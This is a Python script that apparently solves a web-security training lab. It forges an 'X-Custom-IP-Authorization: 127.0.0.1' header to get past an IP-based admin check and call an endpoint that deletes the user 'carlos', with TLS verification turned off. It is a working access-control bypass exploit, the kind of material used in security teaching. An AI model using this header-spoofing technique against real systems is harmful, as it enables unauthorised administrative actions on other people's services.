import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_delete_carlos_successful(url, session):
    delete_carlos_url = (
        url + "/admin/delete?username=carlos")
    headers = {
        "X-Custom-IP-Authorization": "127.0.0.1"}
    response = session.get(
        delete_carlos_url,
        headers=headers,
        verify=False,
        proxies=proxies)
    return "Congratulations" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Information Disclosure attack...")
        if not is_delete_carlos_successful(url, session):
            print("[-] The Information Disclosure attack was not successful.")
            sys.exit(FAIL)
        print("[+] The Information Disclosure attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Information Disclosure attack was not successful.")
        sys.exit(FAIL) 